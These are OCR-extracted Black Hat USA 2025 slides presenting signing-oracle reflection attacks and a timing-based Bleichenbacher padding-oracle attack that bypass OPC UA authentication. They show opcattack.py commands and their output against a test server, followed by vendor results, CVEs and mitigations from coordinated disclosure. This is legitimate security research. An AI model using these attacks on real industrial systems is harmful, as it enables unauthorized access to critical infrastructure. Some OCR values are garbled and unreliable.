---
title: "No VPN Needed Cryptographic Attacks Against the OPC UA Protocol"
speakers: ["Tom Tervoort"]
conference: "Black Hat"
conference_full: "Black Hat USA 2025"
edition: "USA"
year: 2025
source_pdf: "BlackHat_USA_2025_Slides/Tom Tervoort_No VPN Needed Cryptographic Attacks Against the OPC UA Protocol.pdf"
pages: 31
sha256: "0a84451edc027c9d5a217e13f91c3f83452ad5050bb1ba1adc7456d2e400a5fe"
text_chars: 18532
ocr_pages: 14
has_ocr: true
redacted_secrets: 0
ocr_confidence: 89.7
ocr_unreliable_blocks: 3
ocr_timeouts: 0
pages_recovered_from_text_layer: 0
companion_files: ["Tom Tervoort_No VPN Needed Cryptographic Attacks Against the OPC UA Protocol_TOOLS.txt"]
extractor: "pymupdf4llm 1.28.2 + tesseract"
converted_at: "2026-08-12T05:24:18Z"
---
# No VPN Needed Cryptographic Attacks Against the OPC UA Protocol

**Speakers:** Tom Tervoort  
**Conference:** Black Hat USA 2025  
**Source:** `BlackHat_USA_2025_Slides/Tom Tervoort_No VPN Needed Cryptographic Attacks Against the OPC UA Protocol.pdf` (31 pages)


## Slide 1

## No VPN Needed? Cryptographic Attacks Against the OPC UA Protocol

Tom Tervoort

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 91/100 on the text kept, 88/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
EFINGS
AUGUST a 2025
MANDALAY BAY / LAS VEGAS
No VPN Needed?
Cryptographic Attacks Against the OPC UA Protocol
Tom Tervoort
```

## Slide 2

### **INTRO**

**2**


> Recovered by OCR — confidence 89/100 on the text kept, 69/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Ty
182
VERITAS
TOM TERVOORT
Principal Security Specialist
I tom tervoort@bureauveritas.com
BUREAU VERITAS CYBERSECURITY
BUREAU
VERITAS
CORPORATE PRESENTATION 2
```

## Slide 3

# Outline

#### **What is OPC UA? OPC UA Cryptography Attack 1: signing oracle auth bypass Attack 2: padding oracle auth bypass Follow-up and conclusions**

#BHUSA @BlackHatEvents

## Slide 4

# What is OPC UA?

#BHUSA @BlackHatEvents

Photos by Magda Ehlers, Tom Fisk, Pixabay, Mattcmoi

## Slide 5

# Why investigate it?

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 95/100 on the text kept, 90/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
OPC UA More exposed
Important <
OPC UA connections are secure in itself, hence generally there is no need for VPN in an OPC UA network
solution. In the past VPN tunnel for secure transmission and remote desktop connections were
used, but OPC UA includes encrypted transmission and adds user authentication and audit
« Secure: OPC UA is highly secure due to its encryption, authentication, checksums, data access, and authorization capabilities.
OPC-UA doesn't require a VPN, and the gateway enables a secure connection for outgoing data to the cloud when the
gateway is established. OPC-UA can also be used in the cloud and at the edge.
```

## Slide 6

# OPC UA security

**Client/server authentication:** X.509 certificates **User authentication:** password, JWT, cert, etc. Can have **both** , **either** or **neither**

**Trust models:** pre-configured, first-time approval, PKI Security Mode, user authentication method, and ciphers are **negotiated** between client and server

|**Security Mode**|**Client/Server Auth**|**Integrity**|**Confidentiality**|
|---|---|---|---|
|None|✗|✗|✗|
|Sign|✓|✓|✗|
|SignAndEncrypt|✓|✓|✓|

#BHUSA @BlackHatEvents

Image by OPC Foundation

## Slide 7

# Secure channel handshake

**(simplified)**

|**Security Policy**|**Encryption scheme**|**Signing scheme**|
|---|---|---|
|None|-|-|
|Basic128Rsa15|RSA PKCS#1v1.5|SHA1 + RSA PKCS#1v1.5|
|Basic256|RSA-OAEP-SHA1|SHA1 + RSA PKCS#1v1.5|
|Basic256Sha256|RSA-OAEP-SHA1|SHA256 + RSA PKCS#1v1.5|
|Aes128_Sha256_RsaOaep|RSA-OAEP-SHA1|SHA256 + RSA PKCS#1v1.5|
|Aes256_Sha256_RsaPss|RSA-OAEP-SHA256|SHA256 + RSA-PSS|

Also various ECC policies; rarely used yet

#BHUSA @BlackHatEvents

## Slide 8

# Session handshake

- Symmetric crypto based on AES and HMAC

- Challenge signing with same certificates as channel phase

- Password-based user auth: encrypt password with server public key, even with None policy

- Certificate-based user auth: sign same server challenge with “user certificate”

- Session bound to channel + key

- Very inefficient protocol: three expensive RSA decrypt/sign operations on each side! But is it secure?

#BHUSA @BlackHatEvents

## Slide 9

# Attacking the session handshake

###### **In server’s CreateSessionResponse:**

###### **In client’s ActivateSessionResponse:**

##### **Looks rather similar…**

#BHUSA @BlackHatEvents

## Slide 10

# Signing oracle “relay attack”

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 88/100 on the text kept, 83/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
blackhat
Signing oracle “relay attack”
a
OPC Server A Attacker OPC Server B
CreateSessionRequest -——— |
Identity: server B
l¢—@ | ClientNonce: ...
CreateSessionResponse
ServerNonce: N
ServerSignature: ... >
CreateSessionRequest
Identity: server A
ClientNonce: N a,
CreateSessionResponse
ServerNonce: ...
ActivateSessionRequest |__| ServerSignature: <sig over A
ClientSignature: <sig over cert + N with B's public key>
A cert + N with B's public
| ——_
ActivateSessionResponse
```

## Slide 11

# Even better: “reflection attack”

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 84/100 on the text kept, 81/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
blackhat
Even better: “reflection attack”
an
OPC Server A Attacker
Identity: server A
l¢— | ClientNonce: ...
| ——— CreateSessionResponse
AuthenticationToken: 1
ServerNonce: N ——
ServerSignature: ...
CreateSessionRequest
le_—_@ | Identity: server A
ClientNonce: N
| ———_ CreateSessionResponse
AuthenticationToken: 2
ServerNonce: ... —>,
ServerSignature: <sig over
cert+N with A's pubkey>
ActivateSessionRequest
AuthenticationToken: 1
le—@ | ClientSignature: <sig over
A cert + N with A's public
key>
ActivateSessionResponse
```

## Slide 12

# But we still need to defeat this…

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 93/100 on the text kept, 91/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
OPC Client OPC Server
OpenSecureChannelRequest
- Chosen security policy
- Client certificate
- Encrypted with server public key and
signed with client private key:
- Random "client nonce oe
OpenSecureChannelResponse
- Encrypted with client public key and
signed with server private key:
Gy - Random "server nonce"
- Channel Token
[>
Both sides derive session keys from nonces
```

## Slide 13

# …or we just skip it

OPC UA over HTTPS

- Skips secure channel handshake, because TLS already offers transport crypto

- No TLS client certs; **relies on session layer for client authentication**

#BHUSA @BlackHatEvents

## Slide 14

# PoC or it didn’t happen

**https://github.com/SecuraBV/opcattack**

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 89/100 on the text kept, 83/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
ar : $ python3 opcattack.py reflect https://opc-testserver:62540/
attempting reflection attack against https://opc-testserver:62540/
Server advertises 7 endpoints.
Targeting https://opc-testserver :62540/Quickstarts/ReferenceServer/ with BASIC256SHA256 security policy.
User certificate required. Reusing the server certificate to forge user token.
Attack succesfull! Authenticated session set up with https://opc-testserver:62540/Quickstarts/ReferenceServer/.
Trying to browse data via authenticated channel.
Tree:
+ <root>
|+ Objects (OBJECT)
|+ Server (OBJECT)
|+ ServerArray (Array):
|+ ServerArray: "“urn:aardvarksoep:UA:Quickstarts:ReferenceServer"
|+ NamespaceArray (Array):
|+ NamespaceArray: "http://opcfoundation.org/UA/"
|+ NamespaceArray: "urn:aardvarksoep:UA:Quickstarts:ReferenceServer"
|+ NamespaceArray: "http://test.org/UA/Data/"
|+ NamespaceArray: "http://test.org/UA/Data/Instance"
|+ NamespaceArray: "http://opcfoundation.org/UA/Boiler/"
|+ NamespaceArray: "http://opcfoundation.org/UA/Boiler/Instance"
|+ NamespaceArray: "http://test.org/UA/Alarms/"
|+ NamespaceArray: "http://test.org/UA/Alarms/Instance"
|+ NamespaceArray: "http://opcfoundation.org/UA/Diagnostics"
|+ NamespaceArray: "http://samples.org/UA/MemoryBuffer"
|+ NamespaceArray: "http://samples.org/UA/MemoryBuffer/Instance"
|- ServerStatus: <decode error> ("Extension object type ID 864 not registered.")
|- ServiceLevel: "255"
Auditing: "True"
EstimatedReturnTime: "None"
https://github.com/SecuraBV/opcattack
```

## Slide 15

# Idea to attack OPC over TCP: the 1998 classic

**Security Policy Encryption scheme Signing scheme** - - None Basic128Rsa15 RSA PKCS#1v1.5 SHA1 + RSA PKCS#1v1.5 Basic256 RSA-OAEP-SHA1 SHA1 + RSA PKCS#1v1.5 Basic256Sha256 RSA-OAEP-SHA1 SHA256 + RSA PKCS#1v1.5 A 128 Sh 256 R O RSA OAEP SHA1 SHA256 RSA PKCS#1 1 5

#BHUSA @BlackHatEvents

## Slide 16

# Deprecated?

###### However:

- Many implementations allow Basic128Rsa15 by default anyway

- Some implementations attempt to decrypt PKCS#1 ciphertext before checking if Basic128Rsa15 is enabled

- Software updates won’t change existing configurations

- Risks not clear to user; problem is not SHA1

- **OAEP also insecure when keys are reused for PKCS#1**

#BHUSA @BlackHatEvents

## Slide 17

# Bleichenbacher’s attack

**(simplified)**

RSA encryption: RSA padding: message bytestring -> integer m PKCS#1 padding: Server padding check fails: m has different format Otherwise: m starts with 0x02; information on message is leaked Attack: send specifically chosen c values, and observe which decrypt to an m with correct padding. Narrow down exact value of m after +/- 1,000,000 queries to the “padding oracle”.

#BHUSA @BlackHatEvents

## Slide 18

# Two private key operations

Note: Bleichenbacher attack can also **spoof signatures** because RSA signing ≈ RSA decryption

#BHUSA @BlackHatEvents

## Slide 19


> Recovered by OCR — confidence 86/100 on the text kept, 81/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
OPC Server
Attacker
Attacker's client nonce
Bleichenbacher attack
I< >|
I< >
I< >|
I< >
I< >|
I< >|
Ey spoofed!
OpenSecureChannelRequest
- Chosen security policy
- Server's own certificate
- Message with spoofed signature
encrypted with server public key:
Attacker's client nonce ae
OpenSecureChannelResponse
- Encrypted with server public key and
signed with server private key:
ZN
2222222
Bleichenbacher attack
I< >
I< >|
I< >|
- Random "server nonce" decrypted!
- Channel Token :
Can compute 4
```

## Slide 20

# Error-based padding oracle

- Different behaviour per implementation

- For some padding errors can be distinguished; for others they are identical to signature errors (which occur after decrypting an invalid message)

#BHUSA @BlackHatEvents

## Slide 21

# Timing-based padding oracle **Maybe valid padding has a different response time?**

**But aren’t timing attacks hard and impractical? Sounds complicated…**

#BHUSA @BlackHatEvents

Images by Yarom et al., Brumley et al., Andrey Grushnikov

## Slide 22

# A timing “side channel amplifier”

###### **“ECB” RSA decryption in OPC UA:**

Idea: repeat same ciphertext block e.g. 100 times Bad padding: do 1 decrypt; then fail Good padding **do 100 decrypts** ; then fail

#BHUSA @BlackHatEvents

ECB Penguin by Filippo Valsorda

## Slide 23

# Timing attacks made easy

Highly sophisticated false positive elimination model:

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 90/100 on the text kept, 88/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**

```text
: good padding; H
97: good padding; time: 0.10941171646118164
98: bad padding; time: 0.0047380924224853516
99: bad padding; time: 0.005006074905395508
few (Oa BoP Se Highly sophisticated false positive elimination model:
Timing experiment results:
Expansion parameter 10:
Average time with correct padding: 0.018887882232666017
Average time with incorrect padding: 0.005357732772827148
Shortest time with correct padding: 0.016694307327270508
Longest time with incorrect padding: 0.022701740264892578
duration > self. threshold:
i range(0, self. repeats):
start = time.time()
self. base. attempt _query(payload)
duration time. time() start
Expansion parameter 30:
Average time with correct padding: 0.03950897693634033
Average time with incorrect padding: 0.005196962356567383
Shortest time with correct padding: 0.035872697830200195
Longest time with incorrect padding: 0.011386394500732422 duration self. threshold:
Expansion parameter 50:
Average time with correct padding: 0.06519682884216309
Average time with incorrect padding: 0.005134844779968261
Shortest time with correct padding: 0.05526590347290039
Longest time with incorrect padding: 0.009844779968261719
Expansion parameter 100:
Average time with correct padding: 0.1187872519683838
Average time with incorrect padding: 0.00542763729095459
Shortest time with correct—paddinga: 0.19398173332214355
Longest time with incorrect padding: 0.013846635818481445
```

## Slide 24

# Wait for it…

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 90/100 on the text kept, 72/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
rt:~/research/opc/tool$ python3 opcattack.py reflect opc.tcp://opc-testserver:4840 --bypass-opn -C 10 -T 0.02
Attempting reflection attack against opc.tcp://opc-testserver :4840
Server advertises 11 endpoints.
No HTTPS endpoints. Trying to bypass secure channel on opc.tcp://opc-testserver:4840 via padding oracle.
Trying sigforge attack to produce OPN signature. . . c
Checking rr endpoints of ope. tp: //opc-testserver:4840 for RSA padding oracle. total: (000:00:02.300 _ record | zero
Endpoint "opc.tcp://opc-testserver:4840" qualifies for OPN oracle. lap:000:00:02.300 record | zero
Trying a bunch of known plaintexts to assess OPN oracle quality and reliability.
Progress:
Base OPN not working. Testing tim
Progress: = =
Timing-based OPN padding oracle scor 100/100
Continuing with Timing-based OPN padding oracle for endpoint opc.tcp://opc-testserver:4840.
*] Starting padding oracle attack...
|] Progress: iteration 0; interval size: 4.93E+611; oracle queries: 111
stopwatch
stop
```

## Slide 25

# Wait for it…

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 92/100 on the text kept, 71/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
rt:~/research/opc/tool$ python3 opcattack.py reflect opc.tcp://opc-testserver:4840 --bypass-opn -C 10 -T 0.02
Attempting reflection attack against opc.tcp://opc-testserver :4840 stopwatch
Server advertises 11 endpoints.
No HTTPS endpoints. Trying to bypass secure channel on opc.tcp://opc-testserver:4840 via padding oracle.
Trying sigforge attack to produce OPN signature. . “O0-
Checking 11 endpoints of opc.tcp://opc-testserver:4840 for RSA padding oracle. total: 000:00:21.283 _ record | zero
Endpoint "opc.tcp://opc-testserver:4840" qualifies for OPN oracle. lap: 000:00:21.283 record | zero
Trying a bunch of known plaintexts to assess OPN oracle quality and reliability.
Progress: stop
Base OPN not working. Testing tim
Progress: = =
Timing-based OPN padding oracle scor 100/100
Continuing with Timing-based OPN padding oracle for endpoint opc.tcp://opc-testserver:4840.
[*] Starting padding oracle attack...
[\] Progress: iteration 1; interval size: 4.93E+611; oracle queries: 3686
```

## Slide 26

# Wait for it…

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 92/100 on the text kept, 73/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
:~/research/opc/tool$ python3 opcattack.py reflect opc.tcp://opc-testserver:4840 --bypass-opn -C 10 -T 0.02
Attempting reflection attack against opc.tcp://opc-testserver :4840
Server advertises 11 endpoints.
No HTTPS endpoints. Trying to bypass secure channel on opc.tcp://opc-testserver:4840 via padding oracle.
Trying sigforge attack to produce OPN signature. . “OA:
Checking 11 endpoints of opc.tcp://opc-testserver:4840 for RSA padding oracle. total: 000:04:57.302 _ record | zero
Endpoint "opc.tcp://opc-testserver:4840" qualifies for OPN oracle. lap: 000:04:57.302 record | zero
Trying a bunch of known plaintexts to assess OPN oracle quality and reliability.
Progress: stop
Base OPN not working. Testing tim
Progress: = =
Timing-based OPN padding oracle scor 100/100
Continuing with Timing-based OPN padding oracle for endpoint opc.tcp://opc-testserver:4840.
*] Starting padding oracle attack...
fl ] Progress: iteration 252; interval size: 2.94E+531; oracle queries: 49323
stopwatch
```

## Slide 27

# Got the signature, and…

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 92/100 on the text kept, 68/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**

```text
Got the signature, and...
[*] Continuing with Timing-based OPN padding oracle for endpoint opc.tcp://opc-testserver :4840.
[*] Starting padding oracle attack...
[\] Progress: iteration 2016; interval size: 2.00E+0; oracle queries: 5586985
[+] Succes! Forged signature:
[*] Message bytes after applying encryption: 4f504e46290600000000000038000000687474703a2f2f6f7063666f756e646174696f 6e2e6f 72672f55412F5365637572697479506F6c6963792342617369
Storing signed+encrypted OPN request in cache file .opncache. json.
Picking a padding oracle for decryption. lap:|000:08:30.788 record | zero
Checking 11 endpoints of opc.tcp://opc-testserver:4840 for RSA padding oracle.
Endpoint “opc.tcp://opc-testserver:4840" qualifies for OPN oracle.
Trying a bunch of known plaintexts to assess OPN oracle quality and reliability
Progress: [
Base OPN not working. Testing timing-based variant (threshold: 0.02 seconds); this may take a minute.
Progress:
Timing-based OPN padding oracle score: 100/100
Continuing with Timing-based OPN padding oracle for endpoint opc.tcp://opc-testserver :4840.
Performing the OPN handshake...
Forged OPN request was accepted. Now keeping this session open while decrypting the first block of the response.
Progress: iteration 1; interval size: 4.93E+611; oracle queries: 165
top
```

## Slide 28

# There we go!

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 85/100 on the text kept, 78/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**

```text
here we go!
[/] Progress: iteration 2016; interval size: 2.00E+0; oracle queries: 3470896
[+] Success! Got the following plaintext: 0002198568a3410e38090001000000010000000100c10199e6 7ca6dce5db019000000000000000000F FFT fff FO0000000000000cef500000800000099e67caédce.
[*] Removed padding. Now parsing OpenSecureChannelResponse to extract channel ID and secret nonce:
+ openSecureChannelResponse (OpenSecureChannelResponse):
|+ typeId (NodeId):
|+ namespace: 0
|+ identifier: 449
|+ responseHeader (ResponseHeader ):
|+ timeStamp: 2025-06-25 14:22:58.633000
|+ requestHandle: 0
|+ serviceResult: 0
|+ serviceDiagnostics: NULL
|+ stringTable: []
|+ additionalHeader: NULL
|+ serverProtocolVersion: 0
|+ securityToken (ChannelSecurityToken):
|+ channelId: 62926
|+ tokenId: 8
|+ createdAt: 2025-06-25 14:22:58.633000
|+ revisedLifetime: 600000
|+ serverNonce: 2e89a0353dac65db5a7dfd055942c834
Trying reflection attack (if channel is still alive).
Creating first session on login endpoint (opc.tcp://opc-testserver :4840)
Got server nonce: b'e9fc274d68bae227244d76e6db48ef 9d2e31311b6F3712c20039d434F8434bc7'
Forwarding nonce to second session on impersonate endpoint (opc.tcp://opc-testserver : 4840)
] Got signature over nonce: b'777fc6cbb269b7fbbd8407133a70a8570dd43e1ec8a706915a94ad3971306748fdf990F064b13F12f511e2e032¢c405374e58e59c5a76b42d048dcadfd55c9F521f429d67d9C
[*] Using signature log in to opc.tcp://opc-testserver : 4840.
Attack succesfull! Authenticated session set up with opc.tcp://opc-testserver :4840. stopwatch
Tryin row: vi henti hannel. .
Ten to browse data via authenticated channel File Edit Run Help
- FolderType
|+ Objects (OBJECT) lap: 000:15:30.502 record | zero
|- FolderType (OBJECTTYPE) ——
|+ Server (OBJECT)
|- ServerType (OBJECTTYPE)
|- Auditing: "False"
|- ServiceLevel: "255"
|+ NamespaceArray (Array):
|+ NamespaceArray: "http://opcfoundation.org/UA/"
|+ NamespaceArray: "“urn:open62541.server.application”
|+ ServerArray (Array):
|+ ServerArray: "“urn:open62541.server.application"
|+ ServerRedundancy (OBJECT)
|- ServerRedundancyType (OBJECTTYPE)
|- RedundancySupport: "0"
|+ VendorServerInfo (OBJECT)
```

## Slide 29

# Tested implementations

|**Software**|**Tested version**|**HTTPS attack**|**Error-based padding**
**oracle**|**Timing-based padding**
**oracle**|
|---|---|---|---|---|
|dataFEED edgeConnecto|r 2024.01|✗|✗|✗|
|Ignition|8.1.38|✗|✓|✓|
|KEPServerEX|6.15.154.0|✗|✗|✓*****|
|open62541|1.4|✗|✗|✓|
|Prosys OPC UA
Simulation Server|5.4.6-180|✓|✓|✓|
|UA-.NETStandard||✓|✓*****|✓*****|
|Reference Server|1.4.372-preview||||
|Unified Automation C++
Demo Server|1.8.2.624|✗|✗|✗|

* Only in non-default configuration

Protocol flaw -> others likely affected Got confirmation about CODESYS and various Siemens products

#BHUSA @BlackHatEvents

## Slide 30

# Follow-up

- Disclosed to OPC Foundation; who coordinated to vendors

- Very fast response!

- CVE’s so far: CVE-2024-42512, CVE-2024-42513, CVE-2025-1468

- Fixes range from software updates to disabling features to configuration advisories

- Check your vendor documentation

- Non-certificate based user authentication is not affected

- Disabling HTTPS and Basic128Rsa15 is usually sufficient, but not always

- Testing and PoC exploitation tool: **https://github.com/SecuraBV/opcattack**

#BHUSA @BlackHatEvents

## Slide 31

# Black Hat Sound Bytes

1. Crypto protocol design is hard, even if you use secure building blocks

2. More than a quarter century later, Bleichenbacher's attack is as relevant as ever.

3. We can probably expect more OPC UA crypto flaws to surface in the future.

So do you need to go back to use a VPN? Well..

#BHUSA @BlackHatEvents

Image by Sinh Tran

## Companion resources

### `Tom Tervoort_No VPN Needed Cryptographic Attacks Against the OPC UA Protocol_TOOLS.txt`

```text
https://github.com/SecuraBV/opcattack
```
